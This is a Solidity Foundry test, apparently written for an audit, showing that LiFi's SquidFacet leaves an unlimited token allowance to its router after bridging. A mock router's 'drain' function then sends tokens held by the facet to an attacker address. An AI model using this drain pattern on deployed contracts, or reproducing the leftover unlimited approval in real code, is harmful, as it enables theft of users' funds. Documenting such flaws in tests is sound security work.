// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {SquidFacet} from "lifi/Facets/SquidFacet.sol";
import {ISquidRouter} from "lifi/Interfaces/ISquidRouter.sol";
import {ISquidMulticall} from "lifi/Interfaces/ISquidMulticall.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockSquidRouter is ISquidRouter {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function bridgeCall(
        string calldata,
        uint256 amount,
        string calldata,
        string calldata,
        bytes calldata,
        address,
        bool
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function callBridge(
        address,
        uint256,
        ISquidMulticall.Call[] calldata,
        string calldata,
        string calldata,
        string calldata
    ) external payable override {
        // not needed for this test
    }

    function callBridgeCall(
        address,
        uint256,
        ISquidMulticall.Call[] calldata,
        string calldata,
        string calldata,
        string calldata,
        bytes calldata,
        address,
        bool
    ) external payable override {
        // not needed for this test
    }

    // Malicious function to drain remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract SquidFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockSquidRouter internal router;
    SquidFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        router = new MockSquidRouter(address(token));
        facet = new SquidFacet(ISquidRouter(address(router)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        ISquidMulticall.Call[] memory calls;
        SquidFacet.SquidData memory squidData = SquidFacet.SquidData({
            routeType: SquidFacet.RouteType.BridgeCall,
            destinationChain: "chain",
            destinationAddress: "dest",
            bridgedTokenSymbol: "MOCK",
            depositAssetId: address(token),
            sourceCalls: calls,
            payload: "",
            fee: 0,
            enableExpress: false
        });

        facet.startBridgeTokensViaSquid{value: 0}(bridgeData, squidData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(router)),
            type(uint256).max
        );

        // attacker sends tokens to facet and router drains them
        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

